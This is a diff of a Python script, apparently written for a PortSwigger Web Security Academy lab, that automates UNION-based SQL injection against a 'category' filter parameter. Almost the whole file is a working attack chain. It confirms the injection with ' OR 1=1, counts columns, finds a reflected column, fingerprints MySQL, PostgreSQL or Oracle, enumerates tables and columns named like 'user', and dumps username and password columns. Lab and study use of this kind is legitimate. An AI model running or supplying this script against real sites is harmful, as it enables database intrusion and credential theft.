@@ -2,18 +2,18 @@ import re
 import requests
 from typing import List, Optional, Tuple
 
-BASE_URL = "https://0a7f00c803add5bb801f12e600cc00b0.web-security-academy.net/filter"
+BASE_URL = "https://0ab40035031acfee837af07600ba00d1.web-security-academy.net/filter"
 PARAM_NAME = "category"
-TIMEOUT = 10  # 秒
+TIMEOUT = 10
 
 session = requests.Session()
-session.headers.update({
-    "User-Agent": "Mozilla/5.0 (SQLi Tester)"
-})
+session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi Tester)"})
 
-COMMENT = "-- "  # Oracle/PostgreSQL/MySQL 都可用（Oracle 需要尾端空白，所以保留空白）
+COMMENT = "-- "  # 通用註解
 
 def send_request(payload: str) -> Optional[requests.Response]:
+    """發送測試請求"""
+    print(f"    [Payload] {payload}")
     try:
         return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
     except requests.RequestException as e:
@@ -21,93 +21,79 @@ def send_request(payload: str) -> Optional[requests.Response]:
         return None
 
 def detect_sqli() -> bool:
+    print("[*] 偵測 SQLi")
     normal_payload = "Gifts"
     sqli_payload = f"' OR 1=1 {COMMENT}"
     normal_resp = send_request(normal_payload)
     sqli_resp = send_request(sqli_payload)
     if not normal_resp or not sqli_resp:
-        print("[!] 無法取得測試回應")
         return False
-    print(f"[+] Normal: {normal_resp.status_code}, len={len(normal_resp.text)}")
-    print(f"[+] SQLi  : {sqli_resp.status_code}, len={len(sqli_resp.text)}")
     if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
-        print("[*] 可能存在 SQLi（以回應長度判斷）")
+        print("[+] 目標可能存在 SQLi")
         return True
-    print("[*] 未偵測到明顯 SQLi（以回應長度判斷）")
+    print("[-] 未偵測到 SQLi")
     return False
 
 def find_columns(max_columns: int = 20) -> Optional[int]:
-    # 以 UNION SELECT NULL, NULL… 方式試探欄位數
+    print("[*] 偵測欄位數")
     for num in range(1, max_columns + 1):
-        payload = "' UNION SELECT " + ",".join(["NULL"] * num) + f" {COMMENT}"
+        payload = "' UNION SELECT " + ",".join(["NULL"] * num)  + f" {COMMENT} "
         resp = send_request(payload)
-        if not resp:
-            continue
-        if resp.status_code == 200 and "error" not in resp.text.lower():
-            print(f"[+] 可能欄位數 = {num}")
+        if resp and resp.status_code == 200 and "error" not in resp.text.lower():
+            print(f"[+] 欄位數 = {num}")
             return num
-        else:
-            print(f"[-] 測試 {num} 欄位失敗（狀態碼 {resp.status_code}）")
-    print("[!] 未能在範圍內找到欄位數")
     return None
 
 def find_display_column(num_cols: int) -> Optional[int]:
-    # 將某一欄置入可辨識字串，確認是否可回顯
+    print("[*] 偵測可回顯欄位")
     for i in range(1, num_cols + 1):
         vals = ["NULL"] * num_cols
-        vals[i - 1] = "'DISP_COL_TEST_123'"
+        vals[i - 1] = "'DISP_COL_TEST'"
         payload = f"' UNION SELECT {','.join(vals)}{COMMENT}"
         resp = send_request(payload)
-        if resp and "DISP_COL_TEST_123" in resp.text:
-            print(f"[+] 可顯示資料的欄位索引 = {i}")
+        if resp and "DISP_COL_TEST" in resp.text:
+            print(f"[+] 可回顯欄位索引 = {i}")
             return i
-    print("[!] 尚未找到可顯示資料的欄位")
     return None
 
 def build_union(num_cols: int, disp_idx: int, expression: str, tail_from: str = "") -> str:
-    """
-    在 disp_idx 放入目標 expression，其餘補 NULL。
-    若需要 FROM 子句（如 Oracle 查 v$version），用 tail_from 帶入 ' FROM ...'
-    """
     vals = ["NULL"] * num_cols
     vals[disp_idx - 1] = expression
-    if tail_from:
-        return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"
-    else:
-        return f"' UNION SELECT {','.join(vals)} {COMMENT}"
+    return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"
 
 def try_detect_dbms(num_cols: int, disp_idx: int) -> Tuple[Optional[str], Optional[str]]:
-    """
-    回傳 (dbms, raw_version_text)
-    dbms ∈ {'mysql','postgres','oracle'} or None
-    """
-    # MySQL: @@version
-    mysql_payload = build_union(num_cols, disp_idx, "@@version")
-    r = send_request(mysql_payload)
-    if r and r.status_code == 200 and re.search(r"(?i)mariadb|mysql|innodb|percona|xtradb", r.text):
-        print("[+] 偵測到 MySQL/MariaDB")
-        return "mysql", r.text
-
-    # PostgreSQL: version()
-    pg_payload = build_union(num_cols, disp_idx, "version()")
-    r = send_request(pg_payload)
-    if r and r.status_code == 200 and re.search(r"(?i)postgresql|on x86_64|gcc", r.text):
-        print("[+] 偵測到 PostgreSQL")
-        return "postgres", r.text
-
-    # Oracle: v$version.banner
-    oracle_payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
-    r = send_request(oracle_payload)
-    if r and r.status_code == 200 and re.search(r"(?i)oracle\s+database|oracle corporation", r.text):
-        print("[+] 偵測到 Oracle")
-        return "oracle", r.text
-
-    print("[!] 無法可靠判斷 DBMS（可能被 WAF 過濾或不是 UNION 型）")
+    print("[*] 偵測 DBMS")
+    tests = {
+        "mysql": build_union(num_cols, disp_idx, "@@version"),
+        "postgres": build_union(num_cols, disp_idx, "version()"),
+        "oracle": build_union(num_cols, disp_idx, "banner", " FROM v$version"),
+    }
+    for dbms, payload in tests.items():
+        r = send_request(payload)
+        if not r: 
+            continue
+        text = r.text.lower()
+        if dbms == "mysql" and "mysql" in text:
+            print("[+] DBMS = MySQL/MariaDB")
+            return dbms, r.text
+        if dbms == "postgres" and "postgresql" in text:
+            print("[+] DBMS = PostgreSQL")
+            return dbms, r.text
+        if dbms == "oracle" and "oracle" in text:
+            print("[+] DBMS = Oracle")
+            return dbms, r.text
     return None, None
 
-import re
+def _html_to_lines(html: str):
+    # 把易視為分行的標籤換成換行，其他標籤移除，再切行
+    x = re.sub(r"(?i)<\s*br\s*/?\s*>", "\n", html)
+    x = re.sub(r"(?i)</?(p|tr|td|li|div|span|pre|code|h\d)[^>]*>", "\n", x)
+    x = re.sub(r"<[^>]+>", "", x)  # 去掉其餘標籤
+    lines = [ln.strip() for ln in x.splitlines() if ln.strip()]
+    return lines
 
 def dump_version(num_cols: int, disp_idx: int, dbms: str):
+    print("[*] 取得 DB 版本")
     if dbms == "mysql":
         payload = build_union(num_cols, disp_idx, "@@version")
     elif dbms == "postgres":
@@ -115,7 +101,7 @@ def dump_version(num_cols: int, disp_idx: int, dbms: str):
     elif dbms == "oracle":
         payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
     else:
-        print("[!] 未知 DBMS，略過版本輸出")
+        print("[-] 未知 DBMS，略過版本輸出")
         return
 
     r = send_request(payload)
@@ -123,81 +109,73 @@ def dump_version(num_cols: int, disp_idx: int, dbms: str):
         print("[-] 無法取得版本資訊")
         return
 
-    # 嘗試抽取版本字串
-    version_patterns = [
-        r"\d+\.\d+\.\d+[^<\s]*",   # e.g. 8.0.30, 12.1.0.2.0, 13.3
-        r"PostgreSQL\s[\d\.]+",    # e.g. PostgreSQL 13.3
-        r"Oracle\sDatabase\s[^<\s]+" # e.g. Oracle Database 19c
-    ]
-    for pat in version_patterns:
-        match = re.search(pat, r.text, re.IGNORECASE)
-        if match:
-            print(f"[+] DB Version: {match.group(0)}")
+    lines = _html_to_lines(r.text)
+
+    if dbms == "postgres":
+        # 直接回傳含 PostgreSQL 的整行 → e.g.
+        # "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
+        for ln in lines:
+            if "PostgreSQL" in ln:
+                print(f"[+] DB Version = {ln}")
+                return
+
+    elif dbms == "oracle":
+        # 取含 Oracle Database 的整行（通常是 banner 其中一列）
+        for ln in lines:
+            if "Oracle" in ln and "Database" in ln:
+                print(f"[+] DB Version = {ln}")
+                return
+
+    elif dbms == "mysql":
+        # 先找包含 MySQL/MariaDB 的整行；找不到再退回純版本號
+        for ln in lines:
+            if "MySQL" in ln or "MariaDB" in ln:
+                print(f"[+] DB Version = {ln}")
+                return
+        m = re.search(r"\b\d+\.\d+\.\d+(?:-[A-Za-z0-9._-]+)?\b", " ".join(lines))
+        if m:
+            print(f"[+] DB Version = {m.group(0)}")
             return
 
-    # fallback → 沒找到就輸出前幾百字 debug
-    print("[?] 無法準確抽取版本字串，回應片段：")
-    print(r.text[:300])
+    # 落空時給一小段片段以利除錯（仍避免整頁）
+    print("[?] 無法準確抽取版本字串，回應片段：", " ".join(lines)[:200])
 
 
 def list_user_like_tables(num_cols: int, disp_idx: int, dbms: str) -> List[str]:
-    """
-    回傳可能與 user 相關的表名清單（粗糙從 HTML 反頁面擷取）
-    """
+    print("[*] 搜尋 user-like 資料表")
     if dbms == "mysql":
-        expr = "table_name"
-        tail = (" FROM information_schema.tables "
-                "WHERE LOWER(table_name) LIKE '%user%' "
-                "AND table_schema NOT IN ('information_schema','mysql','performance_schema','sys')")
+        expr, tail = "table_name", (
+            " FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%' "
+            "AND table_schema NOT IN ('information_schema','mysql','performance_schema','sys')")
     elif dbms == "postgres":
-        expr = "table_name"
-        tail = (" FROM information_schema.tables "
-                "WHERE LOWER(table_name) LIKE '%user%' "
-                "AND table_schema NOT IN ('information_schema','pg_catalog')")
+        expr, tail = "table_name", (
+            " FROM information_schema.tables WHERE LOWER(table_name) LIKE '%user%' "
+            "AND table_schema NOT IN ('information_schema','pg_catalog')")
     elif dbms == "oracle":
-        expr = "table_name"
-        tail = (" FROM all_tables "
-                "WHERE LOWER(table_name) LIKE '%user%'")
+        expr, tail = "table_name", " FROM all_tables WHERE LOWER(table_name) LIKE '%user%'"
     else:
-        print("[!] 未知 DBMS，略過抓表")
         return []
-
     payload = build_union(num_cols, disp_idx, expr, tail)
     r = send_request(payload)
-    tables = []
-    if r and r.status_code == 200:
-        print("[+] 回應中嘗試抓取 user-like 表名…")
-        # 最簡單粗略法：撈出像表名的 token
-        # 1) 抓單字母/數字/底線構成的片段
-        candidates = set(re.findall(r"\b[a-zA-Z0-9_]{3,}\b", r.text))
-        for c in candidates:
-            if "user" in c.lower():
-                tables.append(c)
-        tables = sorted(set(tables))
-        print(f"[+] 可能表名：{tables}")
+    if not r: return []
+    candidates = re.findall(r"\b[a-zA-Z0-9_]{3,}\b", r.text)
+    tables = sorted({c for c in candidates if "user" in c.lower()})
+    if tables:
+        print(f"[+] 找到表：{tables}")
     return tables
 
 def list_columns(num_cols: int, disp_idx: int, dbms: str, table: str) -> List[str]:
+    print(f"[*] 抓取 {table} 欄位")
     if dbms in ("mysql", "postgres"):
-        expr = "column_name"
-        tail = (f" FROM information_schema.columns "
-                f"WHERE table_name='{table}'")
+        expr, tail = "column_name", f" FROM information_schema.columns WHERE table_name='{table}'"
     elif dbms == "oracle":
-        expr = "column_name"
-        # Oracle 資料字典表名/欄位名預設大寫
-        tail = (f" FROM all_tab_columns WHERE table_name='{table.upper()}'")
+        expr, tail = "column_name", f" FROM all_tab_columns WHERE table_name='{table.upper()}'"
     else:
         return []
-
     payload = build_union(num_cols, disp_idx, expr, tail)
     r = send_request(payload)
-    cols = []
-    if r and r.status_code == 200:
-        # 抽欄位名（英數與底線）
-        cols = sorted(set(re.findall(r"\b[a-zA-Z0-9_]{2,}\b", r.text)))
-        # 嘗試過濾雜訊，只保留看起來像欄位名的 token
-        # 以存在 table 名稱的頁面為基底，這裡先不做過度過濾
-    print(f"[+] {table} 欄位（猜測）：{cols}")
+    if not r: return []
+    cols = sorted(set(re.findall(r"\b[a-zA-Z0-9_]{2,}\b", r.text)))
     return cols
 
 def dump_credentials(num_cols: int, disp_idx: int, dbms: str,
@@ -256,40 +234,17 @@ def guess_user_pass_columns(columns: List[str]) -> Tuple[Optional[str], Optional
     return user_col, pass_col
 
 if __name__ == "__main__":
-    print("[*] 開始檢測 SQLi…")
-    if not detect_sqli():
-        exit(0)
-
-    print("[*] 嘗試推測欄位數…")
+    if not detect_sqli(): exit(0)
     col_cnt = find_columns()
-    if not col_cnt:
-        exit(0)
-
-    print("[*] 嘗試尋找可顯示的欄位…")
+    if not col_cnt: exit(0)
     disp_idx = find_display_column(col_cnt)
-    if not disp_idx:
-        exit(0)
-
-    print("[*] 嘗試判斷後端 DBMS 與版本…")
-    dbms, raw_version = try_detect_dbms(col_cnt, disp_idx)
-    if not dbms:
-        print("[!] 無法判斷 DBMS，仍可嘗試以 MySQL 語法強行列舉（可能失敗）")
-        dbms = "mysql"
+    if not disp_idx: exit(0)
+    dbms, _ = try_detect_dbms(col_cnt, disp_idx)
+    if not dbms: dbms = "mysql"
     dump_version(col_cnt, disp_idx, dbms)
-
-    print("[*] 尋找與 user 相關的資料表…")
     tables = list_user_like_tables(col_cnt, disp_idx, dbms)
-    if not tables:
-        print("[!] 沒有在頁面中辨識到 user-like 表名（可能是解析失敗或要換關鍵字）")
-
     for t in tables:
-        print(f"[*] 解析 {t} 欄位…")
         cols = list_columns(col_cnt, disp_idx, dbms, t)
-        if not cols:
-            continue
         ucol, pcol = guess_user_pass_columns(cols)
         if ucol and pcol:
-            print(f"[+] 嘗試從 {t} 以 {ucol}/{pcol} 進行 dump")
             dump_credentials(col_cnt, disp_idx, dbms, t, ucol, pcol)
-        else:
-            print(f"[-] 在 {t} 未找到明顯 user/pass 欄位（columns: {cols[:20]}…）")
